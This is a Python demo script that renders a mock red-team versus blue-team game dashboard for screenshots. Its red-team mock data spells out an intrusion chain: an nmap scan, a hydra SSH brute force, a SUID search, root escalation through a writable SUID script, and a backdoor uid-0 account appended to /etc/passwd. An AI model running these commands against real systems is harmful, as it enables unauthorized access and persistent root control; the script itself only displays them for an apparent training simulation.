"""Render the dashboard layout with realistic mock data for screenshots.

Runs without a live orchestrator. Prints a single non-live snapshot to the
terminal so the frame can be captured by a screenshot tool.

Usage:
    python -m display.demo
"""

from __future__ import annotations

import time

from rich.console import Console

from display.dashboard import _apply_layout, make_layout


def _mock_status() -> dict:
    """Realistic mid-battle game status."""
    return {
        "phase": "battle",
        "elapsed": 7,
        "turn": 7,
        "max_turns": 20,
        "scores": {"red": 45, "blue": 60},
        "red_kill_chain": ["recon", "exploit", "privesc"],
        "win_condition": {"game_over": False, "reason": ""},
    }


def _mock_red_actions() -> list[dict]:
    """Five recent red-team decisions, most recent last."""
    now = time.time()
    return [
        {
            "timestamp": now - 45,
            "command": "nmap -sV -p1-1000 10.0.0.5",
            "stdout": "22/tcp open ssh OpenSSH 7.2p2\n80/tcp open http Apache 2.4.18\n3306/tcp open mysql MySQL 5.7.21",
        },
        {
            "timestamp": now - 32,
            "command": "hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.0.0.5",
            "stdout": "[22][ssh] host: 10.0.0.5 login: admin password: letmein2024",
        },
        {
            "timestamp": now - 20,
            "command": "ssh admin@10.0.0.5 'find / -perm -4000 2>/dev/null'",
            "stdout": "/usr/bin/passwd\n/usr/bin/sudo\n/usr/local/bin/backup.sh  <-- writable SUID",
        },
        {
            "timestamp": now - 10,
            "command": "ssh admin@10.0.0.5 '/usr/local/bin/backup.sh; id'",
            "stdout": "uid=0(root) gid=0(root) groups=0(root)",
        },
        {
            "timestamp": now - 2,
            "command": "ssh admin@10.0.0.5 'echo \"svc:x:0:0::/root:/bin/bash\" >> /etc/passwd'",
            "stdout": "",
        },
    ]


def _mock_blue_actions() -> list[dict]:
    """Five recent blue-team decisions, most recent last."""
    now = time.time()
    return [
        {
            "timestamp": now - 50,
            "command": "ufw default deny incoming && ufw allow 22/tcp && ufw enable",
            "stdout": "Firewall is active and enabled on system startup",
        },
        {
            "timestamp": now - 38,
            "command": "sed -i 's/PermitRootLogin yes/PermitRootLogin no/' /etc/ssh/sshd_config && systemctl restart ssh",
            "stdout": "SSH hardened: root login disabled",
        },
        {
            "timestamp": now - 25,
            "command": "tail -n 50 /var/log/auth.log | grep -i 'failed\\|accepted'",
            "stdout": "47 failed SSH attempts from 10.0.0.3 in last 2 min — possible brute force",
        },
        {
            "timestamp": now - 12,
            "command": "iptables -A INPUT -s 10.0.0.3 -j DROP",
            "stdout": "Blocked 10.0.0.3 at firewall",
        },
        {
            "timestamp": now - 1,
            "command": "ps aux | grep -v grep | awk '$1==\"root\"&&$11!~/^\\[/'",
            "stdout": "root 8421 /usr/local/bin/backup.sh  <-- SUSPICIOUS non-standard root proc",
        },
    ]


def render_snapshot() -> None:
    """Render one dashboard frame with mock data to stdout."""
    layout = make_layout()
    status = _mock_status()
    red = _mock_red_actions()
    blue = _mock_blue_actions()
    _apply_layout(layout, status, red, blue, game_id=1)

    console = Console()
    # Fixed height so the whole layout renders even when piped/captured.
    with console.capture() as cap:
        console.print(layout, height=30)
    print(cap.get())


if __name__ == "__main__":
    render_snapshot()
